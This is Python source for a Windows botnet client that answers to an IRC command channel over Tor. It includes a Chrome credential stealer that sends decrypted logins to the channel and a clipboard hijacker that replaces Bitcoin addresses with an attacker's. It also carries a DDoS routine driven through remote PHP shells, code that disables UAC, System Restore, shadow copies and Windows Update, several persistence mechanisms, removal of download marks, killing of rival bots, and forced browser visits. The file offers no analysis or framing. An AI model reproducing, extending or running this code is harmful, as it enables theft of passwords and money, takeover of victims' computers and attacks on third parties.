def gethash(code):
    m = sha256()
    m.update(code)
    return m.hexdigest()
def fire(host,ip,seconds,port):
    try:
        reply = urllib.urlopen(host).read()
        if 'engine' in reply:
            urlopen(host+"?act=engine&host="+ip+"&time="+seconds+"&port="+port).read()
        else:
            urlopen(host+"?act=phptools&host="+ip+"&time="+seconds+"&port="+port).read()  
    except:
        pass
def shellBoot(time, threads, ip, port, shellist):
    hosts = urlopen(shellist).read().split()
    for host in hosts:
        for x in range(0,threads):
            while 1:
                worked=False
                try:
                    start_new_thread(fire,(host,ip,time,port))
                    worked=True
                except:
                    pass
                if worked == True:
                    break
def ChromeStealer(s, ircChannel, ircChannelkeyword):
    # Connect to the Database
    XP=False
    if release() == "XP":
        XP=True
    Chrome=False
    Files = []
    if XP == True:
        if path.isdir(getenv("USERPROFILE")+"\\Local Settings\\Application Data\\Google\\Chrome\\User Data"):
            for lol in listdir(getenv("USERPROFILE")+"\\Local Settings\\Application Data\\Google\\Chrome\\User Data"):
                if path.isfile(getenv("USERPROFILE")+"\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\"+lol+"\\Login Data"):
                     Files.append(getenv("USERPROFILE")+"\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\"+lol+"\\Login Data")
                     Chrome=True
    else:
        if path.isdir(getenv("APPDATA")+"\\..\\Local\\Google\\Chrome\\User Data\\"):
            for lol in listdir(getenv("APPDATA")+"\\..\\Local\\Google\\Chrome\\User Data\\"):
                if path.isfile(getenv("APPDATA")+"\\..\\Local\\Google\\Chrome\\User Data\\"+lol+"\\Login Data"):
                    Files.append(getenv("APPDATA")+"\\..\\Local\\Google\\Chrome\\User Data\\"+lol+"\\Login Data")
                    Chrome=True
    if Chrome == True:
        s.send("PRIVMSG "+ircChannel+" :Chrome found. Recovering logins for all users in format USER:PASSWORD:URL.\r\n")
    else:
        s.send("PRIVMSG "+ircChannel+" :Chrome not found. Unable to recover logins.\r\n")
    for theFile in Files:
        try:
            num=0
            conn = sqlite3.connect(theFile)
            cursor = conn.cursor()
            # Get the results
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            for result in cursor.fetchall():
              # Decrypt the Password
                password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
                if password:
                    num=num+1
                    output = result[1]
                    if not output == "":
                        output = output + ":"
                    if not password == "":
                        output = output + password + ":"
                    if not result[0] == "":
                        output = output + result[0]
                    if (keyword.lower() == "all") or (keyword in output):
                        s.send("PRIVMSG "+ircChannel+" :"+output+"\r\n")
            if num > 0:
                s.send("PRIVMSG "+ircChannel+" :Finished recovering Chrome logins.\r\n")
            else:
                s.send("PRIVMSG "+ircChannel+" :Error: No logins in Chrome installation.\r\n")
        except:
            pass
clipcoinaddress=""
clipcoinAddress=""
class BCAddressField(forms.CharField):
  default_error_messages = {
    'invalid': 'Invalid Bitcoin address.',
    }

  def __init__(self, *args, **kwargs):
    super(BCAddressField, self).__init__(*args, **kwargs)

  def clean(self, value):
    value = value.strip()
    if match(r"[a-zA-Z1-9]{27,35}$", value) is None:
      raise ValidationError(self.error_messages['invalid'])
    version = get_bcaddress_version(value)
    if version is None:
      raise ValidationError(self.error_messages['invalid'])
    return value

__b58chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
__b58base = len(__b58chars)

def b58encode(v):
  """ encode v, which is a string of bytes, to base58.                                                                                                               
  """

  long_value = 0L
  for (i, c) in enumerate(v[::-1]):
    long_value += (256**i) * ord(c)

  result = ''
  while long_value >= __b58base:
    div, mod = divmod(long_value, __b58base)
    result = __b58chars[mod] + result
    long_value = div
  result = __b58chars[long_value] + result                                                                                                                
  nPad = 0
  for c in v:
    if c == '\0': nPad += 1
    else: break

  return (__b58chars[0]*nPad) + result

def b58decode(v, length):
  long_value = 0L
  for (i, c) in enumerate(v[::-1]):
    long_value += __b58chars.find(c) * (__b58base**i)

  result = ''
  while long_value >= 256:
    div, mod = divmod(long_value, 256)
    result = chr(mod) + result
    long_value = div
  result = chr(long_value) + result

  nPad = 0
  for c in v:
    if c == __b58chars[0]: nPad += 1
    else: break

  result = chr(0)*nPad + result
  if length is not None and len(result) != length:
    return None

  return result

def get_bcaddress_version(strAddress):
  addr = b58decode(strAddress,25)
  if addr is None: return None
  version = addr[0]
  checksum = addr[-4:]
  vh160 = addr[:-4] # Version plus hash160 is what is checksummed                                                                                                    
  h3=SHA256.new(SHA256.new(vh160).digest()).digest()
  if h3[0:4] == checksum:
    return ord(version)
  return None

class ClipboardTheif():
    def __init__(self):
        self.clipboardData = ""
    def grabpossibleBTCaddresses(self, text):
        possibleaddresses=[]
        #starts with 1-3, 26-35 alphanumeric characters
        char = 0
        for character in list(text):
            if character == "1" or character == "2" or character == "3":
                #w00t, possibly a BTC address.
                for x in range(26,35):
                    if len(text) >= char+x:
                        possibleaddresses.append(text[char:char+x])
            char = char + 1
        return possibleaddresses

    def identifyBTCaddresses(self,addresses):
        goodaddresses = []
        for address in addresses:
            if not get_bcaddress_version(address) == None:
                goodaddresses.append(address)
        return goodaddresses

    def replaceBTCaddresses(self,attackeraddress, data):
        try:
            for address in self.identifyBTCaddresses(self.grabpossibleBTCaddresses(data)):
                data = data.replace(address, attackeraddress)
            return data
        except:
            pass
    def grabData(self):
        try:
            win32clipboard.OpenClipboard()
            self.clipboardData = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return self.clipboardData
        except:
            pass
        return 1
    def writeData(self, data):
        try:
            win32clipboard.OpenClipboard()
            win32clipboard.EmptyClipboard()
            win32clipboard.CloseClipboard()
            win32clipboard.OpenClipboard()
            win32clipboard.SetClipboardText(data)
            win32clipboard.CloseClipboard()
            return 0
        except:
            raise
        return 1
    def replaceAllAddresses(self, attackeraddress):
        self.text = self.grabData()
        self.txt = self.replaceBTCaddresses(attackeraddress, self.text)
        self.writeData(self.txt)
botAdmin = False
try:
    temp = listdir(sep.join([environ.get('SystemRoot','\\Windows'),'temp']))
    botAdmin=True
except:
    botAdmin=False
    pass
ircServers = [
    "t4qtu5hr7ngqu4v7.onion:6667:#YourIRCchannelHERE"
]
for ircServer in ircServers:
    print "IRC Server: "+ircServer

def disablers():
    try: 
        aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
        aKey = OpenKey(aReg, r"Software\\Microsoft\\Windows\\Windows Error Reporting", 0, KEY_WRITE)
        subkeys = [ "Disabled", "DontSendAdditionalData",  "LoggingDisabled" ]
        for subkey in subkeys:
            SetValueEx(aKey,subkey,0, REG_SZ, r"1")
    except:
        pass
    try: 
        aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
        aKey = OpenKey(aReg, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE)
        SetValueEx(aKey,"EnableLUA",0, REG_SZ, r"0") 
    except:
        pass
    if botAdmin == True:
        try: 
            aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
            aKey = OpenKey(aReg, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE)
            SetValueEx(aKey,"EnableLUA",0, REG_SZ, r"0") 
        except:
            pass
        try:
            aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
            aKey = OpenKey(aReg, r"Software\\Microsoft\\Windows\\Windows Error Reporting", 0, KEY_WRITE)
            SetValueEx(aKey,"Disabled",0, REG_SZ, r"1")
        except:
            pass
        try:
            aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
            aKey = OpenKey(aReg, r"System\\CurrentControlSet\\Services\\vss", 0, KEY_WRITE)
            SetValueEx(aKey,"Start",0, REG_SZ, r"4") 
        except:
            pass
        try:
            aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
            aKey = OpenKey(aReg, r"System\\CurrentControlSet\\Services\\srservice", 0, KEY_WRITE)
            SetValueEx(aKey,"Start",0, REG_SZ, r"4") 
        except:
            pass
        try:
            aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
            aKey = OpenKey(aReg, r"Software\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", 0, KEY_WRITE)
            SetValueEx(aKey,"DisableSR",0, REG_SZ, r"1")
        except:
            pass
        try:
            aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
            aKey = OpenKey(aReg, r"SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", 0, KEY_WRITE)
            SetValueEx(aKey,"NoAutoUpdate",0, REG_SZ, r"1")
        except:
            pass
try:
    start_new_thread(disablers, ())
except:
    pass
cmdprefix="!" 
regKey=""
botProc = ""
torProc = "tor.exe"
daemonProc = ""
installDir=HERE
channelpassword=""
sshdsAppDataFolder="\\Microsoft"
updateFolder="V89kCdrUpdate"
updateEXE="txID6o5upd.exe"
sshdsFile="\\Log-209832"
meltFile="kad32.dat"
dlexecDir="DL"
version="5"
newfile=str(randrange(0,2000000))
sleep(randrange(0,5))
smartviewURLs=""
smartviewseconds=0.0
browsers = [ "iexplore.exe", "firefox.exe",
             "chrome.exe", "opera.exe" ,
             "browser.exe", "torch.exe",
             "sbframe.exe", "epic.exe",
             "Spark.exe", "Maxthon.exe",
             "icedragon.exe", "qupzilla.exe" ]
def smartViewsettings():
    global smartviewURLs
    global smartviewseconds
    while 1:
        if path.isdir(getenv("APPDATA")+installDir):
            for theFile in listdir(getenv("APPDATA")+installDir):
                if theFile.endswith(".xml"):
                    with open(getenv("APPDATA")+installDir+"\\"+theFile, "r") as fileRead:
                        try:
                            smartviewseconds=float(fileRead.read())
                        except:
                            pass
                elif theFile.endswith(".dat"):
                    with open(getenv("APPDATA")+installDir+"\\"+theFile, "r") as fileRead:
                        try:
                            smartviewURLs=fileRead.read()
                        except:
                            pass
        sleep(60)
start_new_thread(smartViewsettings, ())
def smartView():
    global smartviewURLs
    global smartviewseconds
    while 1:
        if not smartviewURLs=="" and not smartviewseconds < 1.0:
            smartURLs=[]
            if "|" in smartviewURLs:
                smartURLs = smartviewURLs.split("|")
            else:
                smartURLs.append(smartviewURLs)
            smartGood=False
            for URL in smartURLs:
                if not URL == "":
                    smartGood=True
            processes=[]
            processlocations=[]
            pythoncom.CoInitialize()
            c = wmi.WMI()
            opened=False
            for process in c.Win32_Process():
                if opened == False:
                    for browser in browsers:
                        try:
                            if process.Name.lower() == browser.lower():
                                handle = OpenProcess(PROCESS_ALL_ACCESS,False,process.ProcessId)
                                exe = GetModuleFileNameEx(handle, 0)
                                for URL in smartURLs:
                                    if not URL == "":
                                        print "calling: "+exe+" with "+URL
                                        Popen([exe, URL], creationflags=0x08000000, shell=False)
                                        sleep(smartviewseconds)
                                        opened=True
                        except:
                            pass
            if opened == False:
                browserstatic = ["\\Program Files\\QupZilla\\qupzilla.exe",
                                 "\\Program Files\\Comodo\\IceDragon\\icedragon.exe",
                                 "\\Program Files\\Maxthon\\Bin\\Maxthon.exe",
                                 "\\Program Files\\baidu\\Baidu Browser\\Spark.exe",
                                 "LOCALAPPDATASETTINGS\\Epic Privacy Browser\\Application\\epic.exe",
                                 "LOCALAPPDATASETTINGS\\Application Data\\Torch\\Application\\torch.exe",
                                 "\\Program Files\\Opera\\OPERALOCAL\\opera.exe",
                                 "\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                                 "\\Program Files\\Mozilla Firefox\\firefox.exe",
                                 "\\Program Files\\Internet Explorer\\iexplore.exe"]
                realbrowsers = []
                for browserlocal in browserstatic:
                    if "OPERALOCAL" in browserlocal:
                        if path.isfile(browserlocal.split("OPERALOCAL")[0]):
                            try:
                                for directory in listdir(browserlocal.split("OPERALOCAL")):
                                    if path.isfile(directory.replace("OPERALOCAL", directory)):
                                        browserlocal = directory.replace("OPERALOCAL", directory)
                            except:
                                pass
                    if "LOCALAPPDATASETTINGS" in browserlocal:
                        if release() == "XP":
                            browserlocal = browserlocal.replace("LOCALAPPDATASETTINGS", "\\Local Settings\\Application Data")
                        else:
                            browserlocal = browserlocal.replace("LOCALAPPDATASETTINGS", "\\AppData\\Local")
                    if path.isfile(browserlocal):
                        realbrowsers.append(browserlocal)
                    if "Program Files" in browserlocal:
                        browserlocal = browserlocal.replace("Program Files", "Program Files (x86)")
                        if path.isfile(browserlocal):
                            realbrowsers.append(browserlocal)
                for URL in smartURLs:
                    if not URL == "":
                        if len(realbrowsers) > 0:
                            Popen([choice(realbrowsers), URL], creationflags=0x08000000, shell=False)
                            sleep(float(smartviewseconds))
    sleep(2)
start_new_thread(smartView, ())
def clipcoin():
    global clipcoinaddress
    clipObj = ClipboardTheif()
    while 1:
        try:
            if not clipcoinaddress == "":
                clipObj.replaceAllAddresses(clipcoinaddress)
        except:
            pass
        sleep(1)
def getclipcoinAddress():
    global clipcoinaddress
    while 1:
        try:
            worked=False
            for theFile in listdir(getenv("APPDATA")+installDir):
                if theFile.endswith(".ini"):
                    with open(getenv("APPDATA")+installDir+"\\"+theFile, "r") as BTCaddress:
                        clipcoinaddress = BTCaddress.read()
                        worked=True
            if worked == False:
                clipcoinaddress=""
        except:
            pass
        sleep(60)
if not argv[0].endswith(daemonProc):
    start_new_thread(clipcoin, ())
    start_new_thread(getclipcoinAddress, ())
def sendmsg(text,s,channel):
    s.send("PRIVMSG "+channel+" :"+text+"\n")

def killProcess(process_name):
    pythoncom.CoInitialize()
    c = wmi.WMI()
    for process in c.Win32_Process():
        try:
            if process.Name.lower().startswith(process_name.lower()):
                process.Terminate()
        except:
            pass
def IsProcessRunning(ProcName):
    procRunning=False
    pythoncom.CoInitialize()
    c = wmi.WMI()
    for process in c.Win32_Process():
        try:
            if process.Name.lower().startswith(ProcName.lower()):
                procRunning=True
        except:
            pass
    return procRunning
def NumberProcsOpen(ProcName):
    procs=0
    pythoncom.CoInitialize()
    c = wmi.WMI()
    for process in c.Win32_Process():
        try:
            if process.Name.lower().startswith(ProcName.lower()):
                procs=procs+1
        except:
            pass
    return procs - 1
allProcs = 0
if argv[0].endswith(botProc):
    allProcs = allProcs + NumberProcsOpen(botProc)
if not argv[0].endswith(botProc):
    allProcs = allProcs + NumberProcsOpen(argv[0].split("\\")[len(argv[0].split("\\")) - 1])
if allProcs > 1:
    raise SystemExit
server_list = [
 "http://icanhazip.com/",
 "http://myip.dnsdynamic.org/",
 "http://myexternalip.com/raw",
 "http://ip.42.pl/raw",
 "http://curlmyip.com/",
 "http://ipogre.com/linux.php",
 "http://checkip.dyndns.org/plain",
 "http://ipecho.net/plain",
 "http://ifconfig.me/ip",
 "http://ip.dnsexit.com/"
]

country_list = [
    "http://ip.pycox.com/xml",
    "http://freegeoip.net/xml/"
]
goodip=False
country="ERR"
ipaddr="127.0.0.1"
if argv[0].endswith(botProc):
    for server in server_list:
        sleep(1)
        goodip=False
        try:
            ipaddr = urlopen(server).read().replace("\n","").replace("<html><head><title>IP Lookup</title></head><body>IP Address: ","").replace("</body></html>","").replace("<html><head><title>Current IP Check</title></head><body>Current IP Address: ","")
            if "404" in ipaddr or "400" in ipaddr or "403" in ipaddr or "500" in ipaddr or "401" in ipaddr or not "." in ipaddr or "not found" in ipaddr or "Not Found" in ipaddr:
                goodip=False
                break
            goodip=True
        except:
            pass
        if goodip == True:
            break
    if "127.0.0.1" in ipaddr or "a" in ipaddr or "b" in ipaddr or "c" in ipaddr or "d" in ipaddr or "e" in ipaddr or "f" in ipaddr or "g" in ipaddr or "h" in ipaddr or "i" in ipaddr or "j" in ipaddr or "k" in ipaddr or "l" in ipaddr or "m" in ipaddr or "n" in ipaddr or "o" in ipaddr or "p" in ipaddr or "q" in ipaddr or "r" in ipaddr or "s" in ipaddr or "t" in ipaddr or "u" in ipaddr or "u" in ipaddr or "v" in ipaddr or "w" in ipaddr or "x" in ipaddr or "y" in ipaddr or "z" in ipaddr or "404" in ipaddr or "400" in ipaddr or "403" in ipaddr or "500" in ipaddr or "401" in ipaddr or not "." in ipaddr or "not found" in ipaddr or "Not Found" in ipaddr:
        ipaddr="127.0.0.1"
    for server in country_list:
        exitfor=False
        try:
            country = urlopen(server).read()
            a = country.split()
            for b in a:
                b=b.lower()
                if "<country_code>" in b or "<countrycode>" in b:
                    replacestrings = [
                        "<country_code>",
                        "</country_code>",
                        "<countrycode>",
                        "</countrycode>"
                        ]
                    for replacestring in replacestrings:
                        b = b.replace(replacestring, "")
                    country = b.upper()
                    exitfor=True
        except:
            pass
        if exitfor == True:
            break
    badcountry=False
    errorcodes = [ "404", "400", "403", "500", "401", "not found", "<", ">" ]
    for code in errorcodes:
        if code in country.lower():
            badcountry=True
    if "." in country:
        badcountry=True
    if badcountry == True:
        country="E"
print "Your country: "+country+" your IP: "+ipaddr
useSSL = False
doSSHscan=False
doUDPflood=False
doTeamSpeak=False
doTeamSpeaks=False
doFTPflood=False
doFTPSflood=False
doTCPflood=False
doProtect=True
installTor=True
doSSLflood=False
doHTTPflood=False
doHTTPSflood=False
botkiller = False
doomeglespreader = False
maxrand=20000
if argv[0].endswith(updateEXE):
    for x in range(0,2):
        killProcess(daemonProc)
        killProcess(botProc)
        try:
            remove(getenv("APPDATA")+installDir+"\\"+daemonProc)
        except:
            pass
        try:
            remove(getenv("APPDATA")+"\\Microsoft\\Start Menu\\Programs\\Startup\\"+daemonProc)
        except:
            pass
        try:
            remove(getenv("APPDATA")+installDir+"\\"+botProc)
        except:
            pass
        try:
            remove(getenv("APPDATA")+"\\Microsoft\\Start Menu\\Programs\\Startup\\"+botProc)
        except:
             pass
        try:
            key = OpenKey(HKEY_LOCAL_MACHINE, r"Software\\Microsoft\\Windows\\CurrentVersion\\run", 0, KEY_ALL_ACCESS)
            DeleteValue(key, regKey)
        except:
            pass
        try:
            key = OpenKey(HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\run", 0, KEY_ALL_ACCESS)
            DeleteValue(key, regKey)
        except:
            pass
else:
    if path.isfile(getenv("APPDATA")+"\\Microsoft\\"+updateFolder+"\\"+updateEXE):
        if IsProcessRunning(updateEXE):
            killProcess(updateEXE)
        try:
            remove(updateEXE)
        except:
            pass
    if path.isdir(getenv("APPDATA")+"\\Microsoft\\"+updateFolder):
        try:
            rmtree(getenv("APPDATA")+"\\Microsoft\\"+updateFolder)
        except:
            pass
def daemon():
    while doProtect == True:
        if not path.isdir(getenv("APPDATA")+installDir):
            try:
                makedirs(getenv("APPDATA")+installDir)
            except:
                pass
        if not IsProcessRunning(botProc):
            if not path.isfile(getenv("APPDATA")+installDir+"\\"+botProc):
                try:
                    copyfile(argv[0], getenv("APPDATA")+installDir+"\\"+botProc)
                except:
                    pass
            with open(argv[0], "r") as daemonData:
                with open(getenv("APPDATA")+installDir+"\\"+botProc, "r") as botData:
                    if not gethash(daemonData.read()) == gethash(botData.read()):
                        if IsProcessRunning(botProc):
                            killProcess(botProc)
                        remove(getenv("APPDATA")+installDir+"\\"+botProc)
            if path.isfile(getenv("APPDATA")+installDir+"\\"+botProc):
                try:
                    startfile(getenv("APPDATA")+installDir+"\\"+botProc)
                except:
                    pass
        sleep(15)
if argv[0].endswith(daemonProc):
    print "we are the daemon process!"
    daemon()

torURL = "https://dist.torproject.org/torbrowser/4.5.3/tor-win32-0.2.6.9.zip"
torSHA256 = "8d2eda25e32328962c77a829f039a326226fb6c82e658b8cc38b6cfd8d996320"
def downloadTor(outputFolder):
    while True:
        doBreak=False
        try:
            data = urlopen(torURL).read()
            req = Request(torURL)
            req.add_unredirected_header("User-Agent", "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0")
            data = urlopen(req).read()
            del(req)
            with open(outputFolder+"tor.zip", "wb") as code:
                code.write(data)
            with open(outputFolder+"tor.zip", "r") as code:
                if gethash(code.read()) == torSHA256:
                    sourceZip = ZipFile(outputFolder+"tor.zip", 'r')
                    for name in sourceZip.namelist():
                        sourceZip.extractall(outputFolder)
                    sourceZip.close()
                    doBreak=True
            remove(outputFolder+"tor.zip")
        except:
            pass
        if doBreak == True:
            break
        else:
            if path.isfile(outputFolder+"tor.zip"):
                try:
                    remove(outputFolder+"tor.zip")
                except:
                    pass
def killProcessandFile(process_name):
    pythoncom.CoInitialize()
    c = wmi.WMI()
    for process in c.Win32_Process():
        try:
            if process_name.lower() in process.Name.lower():
                handle = OpenProcess(PROCESS_ALL_ACCESS,False, process.ProcessId)
                exe = GetModuleFileNameEx(handle, 0)
                if exe.lower().startswith(process.Name.lower()+".exe"):
                    process.Terminate()
                    remove(exe)
        except:
            pass
def KillProcessandFileList(process_list):
    pythoncom.CoInitialize()
    c = wmi.WMI()
    for process in c.Win32_Process():
        sleep(5)
        for botproc in process_list:
            try:
                if botproc.lower() in process.Name.lower():
                    handle = OpenProcess(PROCESS_ALL_ACCESS,False, process.ProcessId)
                    exe = GetModuleFileNameEx(handle, 0)
                    if exe.lower().startswith(process.Name.lower()+".exe"):
                        process.Terminate()  
                        remove(exe)
            except:
                pass
def torwatch():
    while doProtect == True:
        if not IsProcessRunning("tor.exe"):
            runTor=True
            if path.isfile(getenv("APPDATA")+installDir+"\\Tor\\tor.exe"):
                if path.isfile(getenv("APPDATA")+installDir+"\\Tor\\tor.exe:Zone.Identifier"):
                    try:
                        remove(getenv("APPDATA")+installDir+"\\Tor\\tor.exe:Zone.Identifier")
                    except:
                        pass
                try:
                   startfile(getenv("APPDATA")+installDir+"\\"+torProc)
                except:
                    pass
        sleep(25)
def regedit():
    global botkiller
    global botAdmin
    global regKey
    global installDir
    global botProc
    while doProtect == True:
        sleep(30)
        try:
            if True == botAdmin:
                print "Software\\Microsoft\\Windows\\CurrentVersion\\run"
                key = OpenKey(HKEY_LOCAL_MACHINE, r"Software\\Microsoft\\Windows\\CurrentVersion\\run", 0, KEY_READ)
            else:
                key = OpenKey(HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\run", 0, KEY_READ)
            driveletters = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
            for i in xrange(0, _winreg.QueryInfoKey(key)[1]-1):
                dakey=str(_winreg.EnumValue(key, i)).replace('(','').replace('\'','').replace(',','').split('u"')[0]
                for driveletter in driveletters:
                    dakey=dakey.split('u'+driveletter+':\\\\')[0]
                dakey=dakey.split('u%')[0]
                dakey=dakey.split('u\\')[0]
                dakey=dakey.split(' u 1)')[0].split(' [] 7)')[0].split(' None 3)')[0].split(' 0 4)')[0].split(' \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 11)')[0].split('\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 11)=')[0].split(' u 2)')[0]
                dakey=dakey+'='
                dakey=dakey.split(' =')[0]
                dakey=dakey.split('=')[0]
                listofkeys.append(dakey)
                try:
                    for i in xrange(0, _winreg.QueryInfoKey(key)[1]-1):
                        dakey=str(_winreg.EnumValue(key, i)).replace('(','').replace('\'','').replace(',','').split('u"')[0]
                    for driveletter in driveletters:
                        dakey=dakey.split('u'+driveletter+':\\\\')[0]
                    dakey=dakey.split('u%')[0]
                    dakey=dakey.split('u\\')[0]
                    dakey=dakey.split(' u 1)')[0].split(' [] 7)')[0].split(' None 3)')[0].split(' 0 4)')[0].split(' \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 11)')[0].split('\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 11)=')[0].split(' u 2)')[0]
                    dakey=dakey+'='
                    dakey=dakey.split(' =')[0]
                    dakey=dakey.split('=')[0]
                    listofkeys.append(dakey)
                except:
                    pass
            for lekey in listofkeys:
                if not key == regKey and botkiller == True:
                    try:
                        try:
                            if botAdmin == True:
                                key = OpenKey(HKEY_LOCAL_MACHINE, r"Software\\Microsoft\\Windows\\CurrentVersion\\run", 0, KEY_ALL_ACCESS)
                                DeleteValue(key, lekey)
                            else:
                                key = OpenKey(HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\run", 0, KEY_ALL_ACCESS)
                                DeleteValue(key, lekey)
                        except:
                            pass
                    except:
                        pass
            if True == botAdmin:
                aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
            else:
                aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
            aKey = OpenKey(aReg, r"Software\\Microsoft\\Windows\\CurrentVersion\\run", 0, KEY_WRITE)
            SetValueEx(aKey,regKey,0, REG_SZ, "\""+getenv("APPDATA")+installDir+"\\"+botProc+"\"")
            print "installed to registry."
            sleep(5)
        except:
            pass
def installwindows():
    global tordownloadurl
    global tor
    global installDir
    global botProc
    while doProtect == True:
        sleep(60)
        if path.isdir(getenv("APPDATA")+"\\Microsoft\\Start Menu\\Programs\\Startup"):
            botnetProcs = [ botProc, daemonProc ]
            for botnetProc in botnetProcs:
                if (path.isfile(getenv("APPDATA")+"\\Microsoft\\Start Menu\\Programs\\Startup\\"+botnetProc)) and not (argv[0] == getenv("APPDATA")+"\\Microsoft\\Start Menu\\Programs\\Startup\\"+botnetProc):
                    with open(getenv("APPDATA")+"\\Microsoft\\Start Menu\\Programs\\Startup\\"+botnetProc, "r") as botstartmenudata:
                        with open(argv[0], "r") as botProcdata:
                            if not gethash(botProcdata.read()) == gethash(botstartmenudata.read()):
                                if not IsProcessRunning(botnetProc):
                                    try:
                                        remove(getenv("APPDATA")+"\\Microsoft\\Start Menu\\Programs\\Startup\\"+botnetProc)
                                    except:
                                        pass
                if not path.isfile(getenv("APPDATA")+"\\Microsoft\\Start Menu\\Programs\\Startup\\"+botnetProc):
                    try:
                        copyfile(argv[0], getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+botnetProc)
                    except:
                        pass
                    print "file copied to startup."
                if path.isfile(getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+botProc+":Zone.Identifier"):
                    try:
                        remove(getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+botProc+":Zone.Identifier")
                    except:
                        pass
        if not path.isdir(getenv("APPDATA")+installDir):
            try:
                makedirs(getenv("APPDATA")+installDir)
            except:
                pass
            print "made installation directory."
        if path.isfile(getenv("APPDATA")+installDir+"\\"+daemonProc) and not argv[0] == getenv("APPDATA")+installDir+"\\"+daemonProc:
            with open (getenv("APPDATA")+installDir+"\\"+daemonProc, "r") as daemonData:
                with open(argv[0], "r") as mainData:
                    if not gethash(daemonData.read()) == gethash(mainData.read()):
                        if IsProcessRunning(daemonProc):
                            killProcess(daemonProc)
                        try:
                            remove(getenv("APPDATA")+installDir+"\\"+daemonProc)
                        except:
                            pass
        if not path.isfile(getenv("APPDATA")+installDir+"\\"+daemonProc):
            try:
                copyfile(argv[0], getenv("APPDATA")+installDir+"\\"+daemonProc)
            except:
                pass
            print "wrote daemon file to AppData."
            if path.isfile(getenv("APPDATA")+installDir+"\\"+daemonProc+":Zone.Identifier"):
                try:
                    remove(getenv("APPDATA")+installDir+"\\"+daemonProc+":Zone.Identifier")
                except:
                    pass
        if not IsProcessRunning(daemonProc):
            if path.isfile(getenv("APPDATA")+installDir+"\\"+daemonProc+":Zone.Identifier"):
                try:
                    remove(getenv("APPDATA")+installDir+"\\"+daemonProc+":Zone.Identifier")
                except:
                    pass
            if path.isfile(getenv("APPDATA")+installDir+"\\"+daemonProc) and not argv[0] == getenv("APPDATA")+installDir+"\\"+daemonProc:
                with open(getenv("APPDATA")+installDir+"\\"+daemonProc, "r") as daemonData:
                    with open(argv[0], "r") as mainData:
                        if gethash(daemonData.read()) == gethash(mainData.read()):
                            try:
                                startfile(getenv("APPDATA")+installDir+"\\"+daemonProc)
                            except:
                                pass
        if path.isfile(getenv("APPDATA")+installDir+"\\"+botProc) and not argv[0] == getenv("APPDATA")+installDir+"\\"+botProc:
            with open(getenv("APPDATA")+installDir+"\\"+botProc, "r") as botProcData:
                    with open(argv[0], "r") as mainProcData:
                        if not gethash(mainProcData.read()) == gethash(botProcData.read()):
                            if IsProcessRunning(botProc):
                                killProcess(botProc)
                            try:
                                remove(getenv("APPDATA")+installDir+"\\"+botProc)
                            except:
                                pass
        if not path.isfile(getenv("APPDATA")+installDir+"\\"+botProc):
            try:
                copyfile(argv[0], getenv("APPDATA")+installDir+"\\"+botProc)
            except:
                pass
            print "wrote bot proc to AppData."
            if path.isfile(getenv("APPDATA")+installDir+"\\"+botProc+":Zone.Identifier"):
                try:
                    remove(getenv("APPDATA")+installDir+"\\"+botProc+":Zone.Identifier")
                except:
                    pass
        if path.isfile(getenv("APPDATA")+installDir+"\\"+meltFile):
            try:
                f = open(getenv("APPDATA")+installDir+"\\"+meltFile)
                fileNamewPath = f.read()
                f.close()
                fileName = fileNamewPath.split("\\")[len(fileNamewPath.split("\\")) - 1]
                killProcess(fileName)
                try:
                    remove(fileNamewPath)
                except:
                    pass
                try:
                    remove(getenv("APPDATA")+installDir+"\\"+meltFile)
                except:
                    pass
            except:
                pass
        if not IsProcessRunning(botProc) and not argv[0].endswith(botProc):
            worked=False
            try:
                f = open(getenv("APPDATA")+installDir+"\\"+meltFile, "w")
                f.write(argv[0])
                f.close()
                while 1:
                    if path.isfile(getenv("APPDATA")+installDir+"\\"+botProc) and not argv[0] == getenv("APPDATA")+installDir+"\\"+botProc:
                        with open(getenv("APPDATA")+installDir+"\\"+botProc, "r") as botProcData:
                            with open(argv[0], "r") as mainProcData:
                                if not gethash(mainProcData.read()) == gethash(botProcData.read()):
                                    if IsProcessRunning(botProc):
                                        killProcess(botProc)
                                    try:
                                        remove(getenv("APPDATA")+installDir+"\\"+botProc)
                                    except:
                                        pass
                    if path.isfile(getenv("APPDATA")+installDir+"\\"+botProc+":Zone.Identifier"):
                        try:
                            remove(getenv("APPDATA")+installDir+"\\"+botProc+":Zone.Identifier")
                        except:
                            pass
